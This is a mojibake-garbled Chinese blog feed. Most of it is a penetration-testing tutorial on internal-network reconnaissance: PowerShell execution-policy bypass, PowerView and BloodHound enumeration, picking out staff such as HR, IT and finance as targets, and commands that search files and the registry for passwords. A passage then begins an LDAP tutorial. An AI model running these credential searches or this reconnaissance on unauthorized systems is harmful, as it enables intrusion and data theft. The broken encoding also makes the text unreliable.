Restrictedï¼šé»˜è®¤è®¾ç½®ï¼Œä¸å…è®¸æ‰§è¡Œä»»ä½•è„šæœ¬ã€‚ Allsignedï¼šåªèƒ½è¿è¡Œç»è¿‡è¯ä¹¦éªŒè¯çš„è„šæœ¬ã€‚ Unrestrictedï¼šæƒé™æœ€é«˜ï¼Œå¯ä»¥æ‰§è¡Œä»»æ„è„šæœ¬ã€‚ RemoteSignedï¼šæœ¬åœ°è„šæœ¬æ— é™åˆ¶ï¼Œä½†æ˜¯å¯¹æ¥è‡ªç½‘ç»œçš„è„šæœ¬å¿…é¡»ç»è¿‡ç­¾åã€‚ åœ¨ PowerShell ä¸­è¾“å…¥â€œGet-ExecutionPolicyâ€ï¼Œçœ‹åˆ°ä¸ºé»˜è®¤ Restricted æƒé™ PowerView æ˜¯ä¸€æ¬¾ä¾èµ– PowerShell å’Œ WMI å¯¹å†…ç½‘åŸŸæƒ…å†µè¿›è¡ŒæŸ¥è¯¢çš„å¸¸ç”¨æ¸—é€è„šæœ¬ï¼ŒPowerView é›†æˆåœ¨PowerSploit å·¥å…·åŒ…ä¸­ä¸‹è½½åœ°å€ BypassUAC æœ€ç›´æ¥çš„åŠæ³•ï¼š -ExexutionPolicy ByPass PowerView ä¸­çš„å¸¸ç”¨å‘½ä»¤ # å…ˆ Import-Moudle .\PowerView.ps1 Get-NetDomain #è·å–å½“å‰ç”¨æˆ·æ‰€åœ¨çš„åŸŸåç§° Get-NetUser #è¿”å›æ‰€æœ‰ç”¨æˆ·çš„è¯¦ç»†ä¿¡æ¯ Get-NetDomainController #è·å–æ‰€æœ‰åŸŸæ§åˆ¶å™¨ Get-NetComputer #è·å–æ‰€æœ‰åŸŸå†…æœºå™¨çš„è¯¦ç»†ä¿¡æ¯ Get-NetOU #è·å–åŸŸä¸­çš„ OU ä¿¡æ¯ Get-NetGroup #è·å–æ‰€æœ‰åŸŸå†…ç»„å’Œç»„æˆå‘˜ä¿¡æ¯ Get-NetFileServer #æ ¹æ® SPN è·å–å½“å‰åŸŸä½¿ç”¨çš„æ–‡ä»¶æœåŠ¡å™¨ Get-NetShare #è·å–å½“å‰åŸŸå†…æ‰€æœ‰ç½‘ç»œå…±äº« Get-NetSession #è·å–åœ¨æŒ‡å®šæœåŠ¡å™¨å­˜åœ¨çš„ä¼šè¯ä¿¡æ¯ Get-NetRDPSession # è·å–åœ¨æŒ‡å®šæœåŠ¡å™¨å­˜åœ¨çš„è¿œç¨‹è¿æ¥ä¿¡æ¯ Get-NetProcess #è·å–è¿œç¨‹ä¸»æœºçš„è¿›ç¨‹ä¿¡æ¯ Get-UserEvent #è·å–æŒ‡å®šç”¨æˆ·çš„æ—¥å¿—ä¿¡æ¯ Get-ADObject #è·å–æ´»åŠ¨ç›®å½•çš„å¯¹è±¡ä¿¡æ¯ Get-NetGPO #è·å–åŸŸæ‰€æœ‰ç»„ç­–ç•¥å¯¹è±¡ Get-DomainPolicy # è·å–åŸŸé»˜è®¤æˆ–åŸŸæ§åˆ¶å™¨ç­–ç•¥ Invoke-UserHunter #ç”¨äºè·å–åŸŸç”¨æˆ·ç™»å½•è®¡ç®—æœºåŠè¯¥ç”¨æˆ·æ˜¯å¦æœ‰æœ¬åœ°ç®¡ç†æƒé™ Invoke-ProcessHunter #æŸ¥æ‰¾åŸŸå†…æ‰€æœ‰æœºå™¨è¿›ç¨‹ç”¨äºæ‰¾åˆ°æŸç‰¹å®šç”¨æˆ· Invoke-UserEventHunter #æ ¹æ®ç”¨æˆ·æ—¥å¿—è·å–æŸåŸŸç”¨æˆ·ç™»å½•è¿‡å“ªäº›åŸŸæœºå™¨ åŸŸåˆ†æå·¥å…· BloodHound é€šè¿‡å›¾ä¸çº¿çš„æ–¹å¼ï¼ŒæŠŠåŸŸå†…ä¿¡æ¯ç›´è§‚çš„å±•ç¤º https://github.com/BloodHoundAD/BloodHound/releases/download/2.0.4/BloodHound-win32-x64.zip é…ç½®ç¯å¢ƒ1.ä¸‹è½½å®‰è£…jdkå¹¶é…ç½®2.ä¸‹è½½å®‰è£…Neo4jï¼ˆNeo4j Server -&gt; Community Server-&gt;Windowsï¼‰3.å¯åŠ¨Neo4jæ•°æ®åº“æœåŠ¡ç«¯(neo4j-&gt;éå…³ç³»å‹æ•°æ®åº“. è¿›å…¥è§£å‹åçš„binï¼Œè¾“å…¥å‘½ä»¤ndo4j.bat consoleå¯åŠ¨æœåŠ¡)4.æµè§ˆå™¨è¾“å…¥ï¼š127.0.0.1:7474/browserï¼Œç”¨æˆ·åå¯†ç é»˜è®¤neo4j4.ä¸‹è½½BloodHound, è§£å‹ååŒå‡»exeå¯åŠ¨ï¼Œ è¾“å…¥bolt://localhost:7687å’Œè´¦æˆ·å¯†ç ï¼Œå°±å®‰è£…å¥½äº† ä½¿ç”¨ä¸»ç•Œé¢æŒ‰é’®å’Œé€‰é¡¹æè¿°ï¼šâ€¦â€¦ é‡‡é›†æ•°æ® å“ªäº›ç”¨æˆ·ç™»å½•äº†å“ªäº›æœºå™¨ å“ªäº›ç”¨æˆ·æ‹¥æœ‰ç®¡ç†å‘˜æƒé™ é‚£äº›ç”¨æˆ·å’Œç»„å±äºå“ªäº›ç»„ BloodHoundé‡‡é›†éœ€ä¾èµ–PowerView.ps1çš„BloodHoundï¼šBloodHoundåˆ†ä¸ºä¸¤éƒ¨åˆ†ï¼š 1.PowerShellé‡‡é›†å™¨è„šæœ¬(SharpHound.ps1) 2.å¯æ‰§è¡Œæ–‡ä»¶SharpHound.exe # ä½¿ç”¨SharpHound.exeé‡‡é›†åŸŸå†…ä¿¡æ¯ æŠŠSharpHound.exeå¤åˆ¶åˆ°ç›®æ ‡æœºå™¨ sh.exe -c all å¯¼å…¥æ•°æ®åœ¨å½“å‰ç›®å½•ä¸‹ï¼Œä¼šç”Ÿæˆxxx_BloodHound.zip`å‹ç¼©åŒ…å¯ä»¥æŠŠå‹ç¼©æ–‡ä»¶æ”¾åˆ°ç•Œé¢ä¸ŠèŠ‚ç‚¹ä¿¡æ¯ä»¥å¤–çš„ä»»æ„ä½ç½® æŸ¥è¯¢ä¿¡æ¯ä¸»ç•Œé¢å·¦ä¸Šè§’çš„æŸ¥è¯¢Queries, è¿›å…¥æ¨¡å—ï¼Œå¯ä»¥çœ‹åˆ°é¢„å®šä¹‰çš„å¸¸ç”¨æŸ¥è¯¢æ¡ä»¶ æŒ‰ä½ctrlé”®ï¼Œå¯ä»¥å¾ªç¯æ˜¾ç¤ºï¼› åœ¨å…¶å›¾æ ‡ä¸ŠæŒ‰ä½é¼ æ ‡å·¦é”®å¯ä»¥ç§»åŠ¨ä½ç½® æ•æ„Ÿæ•°æ®çš„é˜²æŠ¤ ä»·å€¼æ¯”è¾ƒé«˜çš„ä¸œè¥¿åŸºæœ¬ä¸Šæ˜¯å…¨éƒ¨åœ¨å†…ç½‘çš„ èµ„æ–™/æ•°æ®/æ–‡ä»¶çš„å®šä½æµç¨‹ å®šä½å†…éƒ¨äººäº‹ç»„ç»‡ç»“æ„ã€‚ åœ¨å†…éƒ¨äººäº‹ç»„ç»‡ä¸­å¯»æ‰¾éœ€è¦ç›‘è§†çš„ç›¸å…³äººå‘˜ã€‚ å®šä½ç›¸å…³äººå‘˜çš„æœºå™¨ã€‚ ç›‘è§†ç›¸å…³äººå·¥ä½œæ—¶å­˜æ”¾æ–‡æ¡£çš„ä½ç½®ã€‚ åˆ—å‡ºå­˜æ”¾æ–‡æ¡£æœåŠ¡å™¨çš„ç›®å½•ã€‚ å®šä½å†…éƒ¨äººäº‹ç»„ç»‡ç»“æ„1. äººäº‹ç»„ç»‡ç»“æ„å›¾ç±»ä¼¼å…¬å¸ç»“æ„å›¾å¯ä»¥åœ¨ç›®æ ‡çš„å¤–éƒ¨ç«™ç‚¹(ç±»å¦‚é¦–é¡µâ€œå…³äºæˆ‘ä»¬â€ )å’Œç½‘ä¸Šæš´éœ²çš„ä¿¡æ¯(ç±»å¦‚å‘è¡¨åœ¨æ‹›è˜ç½‘çš„å„ç±»å²—ä½åç§°)æ¥åˆ†æ,æˆ–è€…åœ¨å†…ç½‘ç”µè„‘ä¸­å¯»æ‰¾ç±»ä¼¼çš„äººäº‹ç»„ç»‡ç»“æ„å›¾, å†ç»“åˆåˆ†æäººäº‹èµ„æ–™é‡Œç›¸å…³å‘˜å·¥èµ„æ–™ä¸åŸŸå†…ç”¨æˆ·åæˆ–è€…ç”¨æˆ·ç»„çš„å¯¹åº” å…³ç³», å¯ä»¥å¾ˆå¿«å®šä½åˆ°ä½ éœ€è¦å¯»æ‰¾çš„äººå‘˜ä½¿ç”¨çš„æœºå™¨ 2. äººåŠ›èµ„æºä¸»ç®¡ä¸ªäººç”µè„‘åœ¨å†…ç½‘ä¸­é€šè¿‡ä¸Šè¿°ç§ç§æ–¹æ³•å®šä½åˆ°äººåŠ›èµ„æºä¸»ç®¡ä¸ªäººæœºå™¨,é€šå¸¸å•ä½äººåŠ›èµ„æºä¸»ç®¡ç”µè„‘ä¸­ä¼šå­˜åœ¨å…¬å¸æ‰€æœ‰äººå‘˜çš„èº«ä»½ä¿¡æ¯åŠç›¸å…³ææ–™,å¯»æ‰¾åˆ°äººåŠ›èµ„æºä¸»ç®¡ä¸ªäººæœºå™¨ååœ¨å…¶ç”µè„‘ä¸­å¯»æ‰¾å…¬å¸äººåŠ›èµ„æºç›¸å…³æ–‡æ¡£å¾—å­˜æ”¾ä½ç½®,ç„¶åä»äººåŠ›èµ„æºæ–‡æ¡£ä¸­å¯»æ‰¾å…¬å¸ç›¸å…³äººå‘˜ä¿¡æ¯,ç›´è‡³æ”¶é›†åˆ°ä½ æ‰€éœ€è¦çš„ææ–™ã€‚ net group /domainå¯ä»¥æŸ¥è¯¢åŸŸå†…æ‰€æœ‰ç”¨æˆ·ç»„çš„ä¿¡æ¯, åŒæ ·å¯ä»¥åˆ©ç”¨è¯¥å‘½ä»¤æ¥å®šä½å…¬å¸å†…éƒ¨äººäº‹ç»“æ„é™¤äº†å†…ç½®é‡ç‚¹ç»„å¤–, è‡ªå»ºçš„åŸŸç»„éœ€è¦ç‰¹åˆ«å…³æ³¨(1)ITç»„/ç ”å‘ç»„: ä»–ä»¬æŒæ¡äº†å¤§é‡çš„å†…ç½‘å¯†ç ,æ•°æ®åº“å¯†ç ç­‰ã€‚ (2)ç§˜ä¹¦ç»„: ä»–ä»¬æŒæ¡ç€å¤§é‡çš„ç›®æ ‡æœºæ„çš„å†…éƒ¨ä¼ è¾¾æ–‡ä»¶å’Œèµ„æ–™,ä¸ºä¿¡æ¯åˆ†æä¸šåŠ¡æä¾›ä¿¡æ¯ã€‚ (3)è´¢åŠ¡ç»„: ä»–ä»¬æŒæ¡ç€ç›®æ ‡æœºæ„å¤§é‡çš„èµ„é‡‘å¾€æ¥ä¸ç›®æ ‡ä¼ä¸šçš„è§„åˆ’å‘å±•,å¹¶ä¸”å¯ä»¥é€šè¿‡èµ„é‡‘è¡¨,æ¥åˆ¤æ–­å‡ºç›®æ ‡ç»„ç»‡çš„æ•´ä½“æ¶æ„ã€‚ (4)CXXç»„: å¦‚ceo cto cooç­‰,ä¸åŒçš„ç»„ç»‡åå­—ä¸åŒ,å¦‚éƒ¨é•¿ã€å‚é•¿ã€ç»ç†ç­‰,ä¼šæ‹¥æœ‰ç›®æ ‡æœºæ„çš„æœºå¯†ä¿¡æ¯ é‡ç‚¹æ ¸å¿ƒä¸šåŠ¡æœºå™¨åŠæ•æ„Ÿä¿¡æ¯é˜²æŠ¤ é‡ç‚¹æ ¸å¿ƒä¸šåŠ¡æœºå™¨æ˜¯æ¸—é€æµ‹è¯•äººå‘˜é€šå¸¸æ¯”è¾ƒå…³å¿ƒçš„æœºå™¨,å› æ­¤éœ€è¦åšå¥½ç›¸åº”çš„é˜²æŠ¤æªæ–½ã€‚ 1.æ ¸å¿ƒä¸šåŠ¡æœºå™¨ - é«˜ç®¡/ç³»ç»Ÿç®¡ç†å‘˜/è´¢åŠ¡/äººäº‹/ä¸šåŠ¡äººå‘˜çš„ä¸ªäººè®¡ç®—æœºã€‚ - äº§å“ç®¡ç†ç³»ç»ŸæœåŠ¡å™¨(ä»“åº“ç®¡ç†ç³»ç»Ÿ) - OA åŠå…¬ç³»ç»ŸæœåŠ¡å™¨ã€‚ - è´¢åŠ¡åº”ç”¨ç³»ç»ŸæœåŠ¡å™¨ã€‚ - æ ¸å¿ƒäº§å“æºç æœåŠ¡å™¨(å¯¹äº IT å…¬å¸,ä¼šæ¶è®¾è‡ªå·±çš„ SVN æˆ–è€… GIT æœåŠ¡å™¨) - æ•°æ®åº“æœåŠ¡å™¨ã€‚ - æ–‡ä»¶æœåŠ¡å™¨/å…±äº«æœåŠ¡å™¨ã€‚ - é‚®ä»¶æœåŠ¡å™¨ã€‚ - ç½‘ç»œç›‘æ§ç³»ç»ŸæœåŠ¡å™¨ã€‚ - å…¶ä»–æœåŠ¡å™¨(åˆ†å…¬å¸ã€å·¥å‚) 2.å„ç±»æ•æ„Ÿæ–‡ä»¶ä¿¡æ¯ - ç«™ç‚¹æºç å¤‡ä»½æ–‡ä»¶ã€æ•°æ®åº“å¤‡ä»½æ–‡ä»¶ã€é…ç½®æ–‡ä»¶å¤‡ä»½ç­‰(åç¼€ XX.zip,XX.sql ç­‰) - å„ç±»æ•°æ®åº“çš„ Web ç®¡ç†å…¥å£,å¦‚ phpmyadminã€adminer ç­‰ã€‚ - æµè§ˆå™¨å¯†ç å’Œæµè§ˆå™¨ cookie(IEã€Chromeã€Firefox) - å…¶ä»–ç”¨æˆ·ä¼šè¯ã€3389 å’Œ ipc$è¿æ¥è®°å½•ã€å„ç”¨æˆ·å›æ”¶ç«™çš„ä¿¡æ¯ç­‰ã€‚ - Windows æ— çº¿å¯†ç ã€‚ - ç›®æ ‡å†…éƒ¨çš„å„ç§è´¦å·å’Œå¯†ç ä¿¡æ¯,åŒ…æ‹¬é‚®ç®±ã€VPNã€FTPã€TeamView ç­‰ã€‚ åº”ç”¨ä¸æ–‡ä»¶å½¢å¼çš„ä¿¡æ¯æ”¶é›†è¯´ç™½äº†å°±æ˜¯ç¿»æ–‡ä»¶ï¼ˆåŒ…æ‹¬ä¸€äº›åº”ç”¨çš„é…ç½®æ–‡ä»¶ã€æ•æ„Ÿæ–‡ä»¶ã€å¯†ç ã€è¿œç¨‹è¿æ¥ã€å‘˜å·¥è´¦å·ã€ç”µå­é‚®ç®±ç­‰ï¼‰ ä¸ç®¡ä»€ä¹ˆé€”å¾„è·å¾—çš„å†…ç½‘æœºå™¨,é¦–å…ˆéœ€è¦çŸ¥é“çš„å°±æ˜¯è¿™å°æœºå™¨æ‰€å±äººå‘˜çš„èŒä½ã€æƒåˆ©,é€šå¸¸ä¸€ä¸ªé«˜æƒåˆ©çš„äººä»–åœ¨å†…ç½‘çš„æƒé™æ¯”ä¸€èˆ¬å‘˜å·¥è¦é«˜å¾ˆå¤š,ä»–çš„ç”µè„‘å†…ä¹Ÿä¼šæœ‰å¾ˆå¤šé‡è¦çš„ã€æ•æ„Ÿçš„ä¸ªäººæˆ–å…¬å¸å†…éƒ¨æ–‡ä»¶ã€‚ ç”¨æˆ·åœ¨å†…ç½‘ä¸­å·¥ä½œæ—¶,å»ºè®®ä¸è¦å°†ä¸€äº›ç‰¹åˆ«é‡è¦çš„èµ„æ–™æ”¾åœ¨å…¬å¼€çš„è®¡ç®—æœºä¸­,å¿…è¦æ—¶ä¸€å®šè¦å¯¹ Office æ–‡æ¡£è¿›è¡ŒåŠ å¯†,å¯†ç ä¹Ÿä¸è¦å¤ªè¿‡äºç®€å• å¸¸ç”¨æœç´¢ï¼š1.æœç´¢æŒ‡å®šå«æœ‰ä»»æ„å¤šå…³é”®å­—çš„æ–‡ä»¶å dir c:\*.doc /s dir /b/s password.txt dir /b/s config.*dir /s *pass* == *cred* == *vnc* ==*.config* 2.æœç´¢æ–‡ä»¶åä¸ºpassword.txt/xml/iniçš„æ–‡ä»¶,è¿™ä¸ªæ“ä½œå¯èƒ½é€ æˆå¤§é‡çš„è¾“å‡º findstr /si password *.xml *.ini *.txt 3.æœç´¢å¸¦æœ‰å…³é”®è¯çš„æ³¨å†Œè¡¨é¡¹,ä¸‹ä¾‹ä¸­æ˜¯æŸ¥è¯¢çš„å…³é”®è¯æ˜¯ â€œpasswordâ€çš„å‘½ä»¤ reg query HKLM /f password /t REG_SZ /s reg query HKCU /f password /t REG_SZ /s 4.å¯¹äºåŠ å¯†officeåŠå…¬è½¯ä»¶ å¦‚æœæ˜¯ä½ç‰ˆæœ¬å¦‚2003çš„è¯,å¯ä»¥åœ¨ç™¾åº¦æœä¸€äº›ç½‘ä¸Šçš„ç ´è§£è½¯ä»¶è¿›è¡Œç ´è§£ã€‚ å¦‚æœæ˜¯é«˜ç‰ˆæœ¬çš„è¯,å¯ä»¥åœ¨ç›®æ ‡ç”¨æˆ·æ‰“å¼€æ–‡ä»¶æ—¶ä½¿ç”¨å¾®è½¯SysinternalsSuiteå¥—è£…ä¸­ çš„æŠ“å–dumpçš„å·¥å…·-procdumpæ¥æŠ“å–å†…å­˜dump,ç„¶åç”¨å†…å­˜æŸ¥çœ‹å™¨ç›´æ¥æŸ¥çœ‹æ–‡ä»¶å†…å®¹ã€‚ åˆ†æåŸŸå†…ç½‘æ®µåˆ’åˆ†æƒ…å†µåŠæ‹“æ‰‘ç»“æ„ ç›®æ ‡ä¸»æœºåŸºæœ¬æ¶æ„çš„åˆ¤æ–­å¸¸è§çš„ Web æ¶æ„ï¼š - ASP + Access + IIS 5.0/6.0 + Windows Sever 2003 - ASPX + MSSQL + IIS 7.0/7.5 + Windows Sever 2008 - PHP + MySQL + IIS - PHP + MySQL + Apache - PHP + MySQL + Ngnix - JSP + MySQL + Ngnix - JSP + MSSQL + Tomcat - JSP + Oracle + Tomcat åŸŸå†…ç½‘æ®µåˆ’åˆ†ä¿¡æ¯å†…ç½‘çš„ç¯å¢ƒåˆ¤æ–­,é¦–å…ˆéœ€è¦åˆ†æä¸‹å†…ç½‘IPåˆ†å¸ƒæƒ…å†µ,ä¸€èˆ¬å¯ä»¥é€šè¿‡å†…ç½‘ä¸­è·¯ç”±å™¨ã€äº¤æ¢æœºç­‰è®¾å¤‡ã€snmpã€å¼±å£ä»¤ç­‰æ¥è·å–å†…ç½‘ç½‘ç»œæ‹“æ‰‘æˆ–DNSåŸŸä¼ é€ä¿¡æ¯æ³„æ¼,å¦å¤–ä¸€èˆ¬å¤§å…¬å¸éƒ½ä¼šæœ‰å†…éƒ¨ç½‘ç«™,ä¹Ÿå¯é€šè¿‡å†…éƒ¨ç½‘ç«™å…¬å¼€å†…å®¹é“¾æ¥æ‰¾å‡ºéƒ¨é—¨ipæ®µã€‚ åˆ†æå‡ºå†…éƒ¨ç½‘ç»œæ˜¯æ€ä¹ˆåˆ’åˆ†çš„?æ˜¯æŒ‰ç…§éƒ¨é—¨åˆ’åˆ†çš„ç½‘ç»œæ®µ?è¿˜æ˜¯æŒ‰ç…§æ¥¼å±‚?è¿˜æ˜¯æŒ‰ç…§åœ°åŒº?é€šå¸¸å†…ç½‘å¯åˆ†ä¸ºDMZåŒºã€åŠå…¬åŒºå’Œæ ¸å¿ƒåŒº(ç”Ÿäº§åŒº),äº†è§£æ•´ä¸ªå†…ç½‘çš„ç½‘ç»œåˆ†å¸ƒå’Œç»„æˆ,ä¹Ÿæœ‰åŠ©äºæˆ‘ä»¬å¯»æ‰¾å†…ç½‘æ ¸å¿ƒä¸šåŠ¡ã€‚ 1.DMZ åŒº åœ¨å®é™…çš„æ¸—é€æµ‹è¯•ä¸­,å¤§å¤šæ•°æƒ…å†µä¸‹,åœ¨å¤–å›´ Web ä¸­æ‹¿åˆ°çš„æƒé™åœ¨ DMZ åŒºã€‚è¿™ä¸ªåŒºåŸŸä¸å± äºä¸¥æ ¼æ„ä¹‰ä¸Šçš„å†…ç½‘ã€‚å¦‚æœ DMZ åŒºåŸŸè®¿é—®æ§åˆ¶ç­–ç•¥é…ç½®åˆç†,DMZ åŒºä¼šå¤„åœ¨å†…ç½‘åŒºèƒ½å¤Ÿè®¿é—® DMZ åŒºè€Œ DMZ åŒºè®¿é—®ä¸äº†å†…ç½‘åŒºçš„æƒ…å†µä¸‹,ç›¸å…³çŸ¥è¯†åœ¨ç¬¬ 1 ç« ä¸­å·²ç»è¯¦ç»†è®²è§£è¿‡,æ­¤å¤„ä¸å†é‡ å¤ã€‚ 2.åŠå…¬åŒº åŠå…¬åŒº,é¡¾åæ€ä¹‰,æ˜¯æŒ‡å…¬å¸å‘˜å·¥æ—¥å¸¸çš„å·¥ä½œåŒºã€‚åŠå…¬åŒºçš„å®‰å…¨é˜²æŠ¤æ°´å¹³ä¸€èˆ¬ä¸æ˜¯é«˜,åŸºæœ¬ é˜²æŠ¤æœºåˆ¶å¤§å¤šä¸ºæ€æ¯’è½¯ä»¶æˆ–ä¸»æœºå…¥ä¾µæ£€æµ‹äº§å“ã€‚åœ¨å®é™…åº”ç”¨ä¸­,æ”»å‡»è€…åœ¨è·å–æƒé™å,åˆ©ç”¨å†…ç½‘ ä¿¡ä»»å…³ç³»,å¾ˆå®¹æ˜“æ‰©å¤§æ”»å‡»é¢ã€‚ä¸€èˆ¬æƒ…å†µä¸‹,æ”»å‡»è€…å¾ˆå°‘ä¼šç›´æ¥åˆ°è¾¾åŠå…¬åŒºã€‚æ”»å‡»è€…å¦‚æœæƒ³è¿›å…¥ åŠå…¬åŒº,å¯èƒ½ä¼šä½¿ç”¨é±¼å‰æ”»å‡»ã€æ°´å‘æ”»å‡»æˆ–è€…ç¤¾ä¼šå·¥ç¨‹å­¦ç­‰æ‰‹æ®µã€‚ åŠå…¬åŒºæŒ‰ç…§ç³»ç»Ÿå¯åˆ†ä¸ºï¼š OA ç³»ç»Ÿã€é‚®ä»¶ç³»ç»Ÿã€è´¢åŠ¡ç³»ç»Ÿã€æ–‡ä»¶å…±äº«ç³»ç»Ÿã€åŸŸæ§ã€ä¼ä¸šç‰ˆæ€æ¯’ ç³»ç»Ÿã€å†…éƒ¨åº”ç”¨ç›‘æ§ç³»ç»Ÿã€è¿ç»´ç®¡ç†ç³»ç»Ÿç­‰,æŒ‰ç…§ç½‘ç»œæ®µå¯åˆ†ä¸ºåŸŸç®¡ç†ç½‘æ®µã€å†…éƒ¨æœåŠ¡å™¨ç³»ç»Ÿç½‘ æ®µã€å„éƒ¨é—¨åˆ†åŒºç½‘æ®µç­‰ã€‚ æŒ‰ç…§ç½‘ç»œæ®µå¯åˆ†ä¸º:åŸŸç®¡ç†ç½‘æ®µã€å†…éƒ¨æœåŠ¡å™¨ç³»ç»Ÿç½‘æ®µã€å„éƒ¨é—¨åˆ†åŒºç½‘æ®µç­‰ã€‚ 3.æ ¸å¿ƒåŒº æ ¸å¿ƒåŒºä¸€èˆ¬å­˜æ”¾ä¼ä¸šæœ€é‡è¦çš„æ•°æ®ã€æ–‡æ¡£ç­‰ä¿¡æ¯èµ„äº§,å¦‚åŸŸæ§åˆ¶å™¨ã€æ ¸å¿ƒç”Ÿäº§æœºå™¨ç­‰,å®‰å…¨ è®¾ç½®ä¹Ÿæœ€ä¸ºä¸¥æ ¼ã€‚æ ¹æ®ç›®æ ‡å¼€å±•çš„ä¸šåŠ¡ä¸åŒ,ç›¸å…³æœåŠ¡å™¨å¯èƒ½å­˜åœ¨äºä¸åŒçš„ç½‘æ®µä¸Šã€‚é€šè¿‡åˆ†ææœ åŠ¡å™¨ä¸Šè¿è¡Œçš„æœåŠ¡å’Œè¿›ç¨‹,å¯ä»¥æ¨æ–­å‡ºç›®æ ‡ä¸»æœºä½¿ç”¨çš„è¿ç»´ç›‘æ§ç®¡ç†ç³»ç»Ÿå’Œå®‰å…¨é˜²æŠ¤ç³»ã€‚åœ¨å†…ç½‘ ä¸­æ¨ªå‘ç§»åŠ¨æ—¶,ä¼šä¼˜å…ˆæŸ¥æ‰¾è¿™äº›ä¸»æœºã€‚ æ ¸å¿ƒåŒºæŒ‰ç…§ç³»ç»Ÿå¯åˆ†ä¸ºä¸šåŠ¡ç³»ç»Ÿã€è¿ç»´ç›‘æ§ç³» æŒ‰ç…§ç½‘ç»œæ®µå¯åˆ†ä¸º:å„ä¸åŒçš„ä¸šåŠ¡ç½‘æ®µã€è¿ç»´ç›‘æ§ç½‘æ®µã€å®‰å…¨ç®¡ç†ç½‘æ®µç­‰ã€‚ å¤šå±‚åŸŸç»“æ„åˆ†ææˆ‘ä»¬éœ€è¦å…ˆåˆ†æå‡ºå½“å‰å†…ç½‘æ˜¯å¦å­˜åœ¨å¤šå±‚åŸŸã€ç°åœ¨è¿™è®¡ç®—æœºæ‰€åœ¨çš„åŸŸæ˜¯å‡ çº§å­åŸŸã€è¿™ä¸ªå­åŸŸçš„åŸŸæ§åˆ¶å™¨åŠæ ¹åŸŸçš„åŸŸæ§åˆ¶å™¨æ˜¯å“ªäº›ã€å…¶ä»–åŸŸçš„åŸŸæ§åˆ¶å™¨æ˜¯å“ªäº›ã€åŸŸä¹‹é—´æ˜¯å¦å­˜åœ¨åŸŸä¿¡ä»»å…³ç³»ç­‰ã€‚ ç»˜åˆ¶å†…ç½‘æ‹“æ‰‘å›¾ åŸºç¡€ä¿¡æ¯æœé›†- æ€ç»´å›¾ document.querySelectorAll('.github-emoji') .forEach(el => { if (!el.dataset.src) { return; } const img = document.createElement('img'); img.style = 'display:none !important;'; img.src = el.dataset.src; img.addEventListener('error', () => { img.remove(); el.style.color = 'inherit'; el.style.backgroundImage = 'none'; el.style.background = 'none'; }); img.addEventListener('load', () => { img.remove(); }); document.body.appendChild(img); });]]></content>
      <categories>
        <category>æ¸—é€æµ‹è¯•</category>
      </categories>
      <tags>
        <tag>æ¸—é€æµ‹è¯•</tag>
        <tag>ä¿¡æ¯æœé›†</tag>
        <tag>å†…ç½‘</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[ubuntu server-LDAP]]></title>
    <url>%2Fposts%2F45429%2F</url>
    <content type="text"><![CDATA[LDAP çœ‹ä¹¦å‰å…ˆçœ‹ç›®å½• ç†è§£ä¸åŒäºæ–‡ä»¶ç³»ç»Ÿçš„ç›®å½•(D/d) -&gt; é¦–å­—æ¯å¤§å†™æ˜¯ç›®å½•æœåŠ¡ï¼Œé¦–å­—æ¯å°å†™çš„æ–‡ä»¶ç³»ç»Ÿç›®å½• ç›®å½•æœåŠ¡æ˜¯ä¼ä¸šç½‘ç»œçš„æ ¸å¿ƒåŸºç¡€ç»“æ„ - å¦‚æ­¤é‡è¦çš„æœåŠ¡å¹¶ä¸è¢«å¤§å¤šæ•°ç†Ÿæ‚‰ - å¾ˆå°‘ç‹¬ç«‹ä½¿ç”¨ï¼Œä¸å…¶ä»–æœåŠ¡ç»“åˆä½¿ç”¨ - å¾®è½¯çš„ä¼ä¸šæˆ˜ç•¥ï¼ˆåŸ‹å‘: ä¸€æ—¦åº•å±‚ç”¨äº†å¾®è½¯çš„AD,ä½ ä»¥åçš„ä¸€äº›è‚¯å®šä¹Ÿè¦ç”¨æˆ‘çš„é›†æˆçš„äº§å“ï¼‰ - ç±»ä¼¼: æ¯ä¸€æœ¬ä¹¦éƒ½æœ‰è‡ªå·±çš„ç›®å½• æ•°æ®é›†ä¸­å­˜å‚¨çš„åº”ç”¨éœ€æ±‚ - é›†ä¸­å­˜å‚¨ã€é›†ä¸­ç®¡ç†ã€é›†ä¸­å®šä½ - èº«ä»½è®¤è¯ã€å…¬é’¥åˆ†å‘ã€é‚®ä»¶è·¯ç”±ã€åœ°å€æŸ¥è¯¢ã€åº”ç”¨é…ç½®ã€å•ç‚¹ç™»å½•(SSO -&gt; åªç™»å½•ä¸€æ¬¡å°±ä¸ç”¨é‡å¤ç™»å½•äº†) - é¢å‘å¤§é‡é¢‘ç¹çš„æ•°æ®æŸ¥è¯¢æ“ä½œï¼Œå°‘é‡å†™æ“ä½œï¼ˆåŸºæœ¬ä¸å˜çš„æ•°æ®ï¼‰ - æƒé™é™åˆ¶æˆæƒç”¨æˆ·æŸ¥è¯¢ æˆ‘æ˜¯å¦åº”è¯¥ä½¿ç”¨ç›®å½•æœåŠ¡(æ ¹æ®è‡ªå·±å…¬å¸æƒ…å†µ) - ç”¨æˆ·è®¤è¯ - æœºå™¨è®¤è¯ - ç”¨æˆ·å’Œç»„ - ç”µè¯åœ°å€è–„ - ç»„ç»‡å‘ˆç° - èµ„äº§è·Ÿè¸ª - é›†ä¸­åº”ç”¨é…ç½® - PEX / ç½‘ç»œè®¾å¤‡é…ç½® DAPè½¯ä»¶æ¶æ„ ä¸åŒä¸SQLçš„åç«¯å±‚çº§åŒ–æ•°æ®åº“ï¼ˆä¸»è¦é¢å‘æŸ¥è¯¢æ“ä½œï¼‰ ä¸DNSçš„åˆ†å¸ƒå¼ç»“æ„æ›´æ¥è¿‘ï¼Œå‘½åä¸Šé€šå¸¸ä¸DBSå‘½åä¿æŒä¸€è‡´(åœ¨ç›®å½•æœåŠ¡å†…æ‰€æœ‰å­˜å‚¨å¯¹è±¡éƒ½æœ‰å”¯ä¸€çš„è·¯å¾„åç§°) æ•°æ®åº“åŸºäºé”®å€¼å¯¹çš„æ–¹å¼å­˜å‚¨æ•°æ® æ ‡å‡†ç»Ÿä¸€çš„æœåŠ¡å‰ç«¯åº”ç”¨æŸ¥è¯¢è®¿é—®æ¥å£(åŸºäºOSIåè®®æ ˆ, X.500) ç»Ÿä¸€çš„å®¢æˆ·ç«¯æŸ¥è¯¢ç»„ä»¶å’Œåè®®(C/S) æ”¯æŒé€šä¿¡ä¼šè¯åŠ å¯† Directory information tree (DIT) ä¸è‡ªå»ºæ•°æ®åº“å¼€å‘ç›¸æ¯” 